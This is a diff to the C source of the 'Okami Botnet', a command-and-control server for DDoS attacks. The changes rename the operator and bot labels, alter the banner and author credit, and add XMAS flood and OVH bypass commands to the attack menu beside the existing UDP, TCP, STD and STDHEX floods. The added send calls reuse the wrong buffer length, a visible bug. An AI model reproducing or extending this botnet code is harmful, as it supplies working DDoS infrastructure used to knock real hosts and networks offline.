@@ -299,7 +299,7 @@ void *titleWriter(void *sock)
         while(1)
         {
                 memset(string, 0, 2048);
-                sprintf(string, "%c]0; Okami | Devices: %d | Demons: %d %c", '\033', clientsConnected(), managesConnected, '\007');
+                sprintf(string, "%c]0; Okami | Bots: %d | Users: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                 if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
  
                 sleep(2);
@@ -378,7 +378,7 @@ void *telnetWorker(void *sock) {
             fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
             ++j;
         }
-        sprintf(botnet, "\x1b[45mWelcome Demon\r\n");
+        sprintf(botnet, "\x1b[45mWelcome User\r\n");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
 		sprintf(botnet, "\033[34;1mUsername\033[33;3m: ");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
@@ -443,7 +443,7 @@ void *telnetWorker(void *sock) {
         { 
         if(strstr(buf, "BOTS")) 
         {  
-          sprintf(botnet, "Devices: %d\r\nDemons: %d\r\n", clientsConnected(), managesConnected, DUPESDELETED);
+          sprintf(botnet, "Bots: %d\r\nUsers: %d\r\n", clientsConnected(), managesConnected, DUPESDELETED);
           if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
         }
           
@@ -453,18 +453,24 @@ if(strstr(buf, "ATTACK")) {
 				char ddosline2  [80];
 				char ddosline3  [80];
 				char ddosline4  [80];
+				char ddosline5  [80];
+				char ddosline6  [80];
 				char ddosline12  [80];
 
 				sprintf(ddosline1, "\e[1;35m !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\r\n");
 				sprintf(ddosline2, "\e[1;35m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
 				sprintf(ddosline3, "\e[1;35m !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\r\n");
 				sprintf(ddosline4, "\e[1;35m !* STDHEX [IP] [PORT] [TIME] | STDHEX FLOOD\r\n");
+				sprintf(ddosline5, "\e[1;35m !* XMAS [IP] [PORT] [TIME]| XMAS FLOOD\r\n");
+				sprintf(ddosline6, "\e[1;35m !* OVH [IP] [PORT] [TIME]| OVH BYPASS\r\n");
 				sprintf(ddosline12, "\e[1;35m !* STOP | KILLS ALL ATTACKS\r\n");
 
 				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, ddosline5,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, ddosline6,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
@@ -633,7 +639,7 @@ int main (int argc, char *argv[], void *sock)
         {
             printf("Good Choice in Threading\n");
         }
-        printf("Okami Botnet.\nCreated by DemonicMods.\r\n");
+        printf("Okami Botnet.\nCreated by UsericMods.\r\n");
         listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
         if (listenFD == -1) abort();
  
